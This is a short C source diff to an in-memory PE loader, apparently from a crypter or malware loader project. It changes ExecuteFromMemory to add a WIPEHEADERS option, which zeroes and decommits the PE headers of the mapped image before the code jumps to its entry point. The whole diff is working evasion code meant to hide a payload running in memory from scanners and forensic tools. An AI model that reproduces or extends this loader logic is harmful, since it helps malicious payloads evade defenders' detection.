@@ -207,12 +207,18 @@ static void ExecuteFromMemory(unsigned char* data) {
     void *entryPtr = (BYTE*)base + nt->OptionalHeader.AddressOfEntryPoint;
 
 #ifdef FREEMEM
-    PVOID stubBase = data;
-    SIZE_T stubSize = nt->OptionalHeader.SizeOfHeaders;
+#ifdef WIPEHEADERS
+    #define MEM base
+#else
+    #define MEM data
+#endif // WIPEHEADERS
+
+    PVOID memBase = MEM;
+    SIZE_T memSize = nt->OptionalHeader.SizeOfHeaders;
 	
-    NtProtectVirtualMemory((HANDLE)-1, &stubBase, &stubSize, PAGE_READWRITE, &oldProtect);
-    RtlSecureZeroMemory(stubBase, stubSize);
-    NtFreeVirtualMemory((HANDLE)-1, &stubBase, &stubSize, MEM_RELEASE);
+    NtProtectVirtualMemory((HANDLE)-1, &memBase, &memSize, PAGE_READWRITE, &oldProtect);
+    RtlSecureZeroMemory(memBase, memSize);
+    NtFreeVirtualMemory((HANDLE)-1, &memBase, &memSize, MEM_DECOMMIT);
 #endif // FREEMEM
 
     ((void(*)(void))entryPtr)();
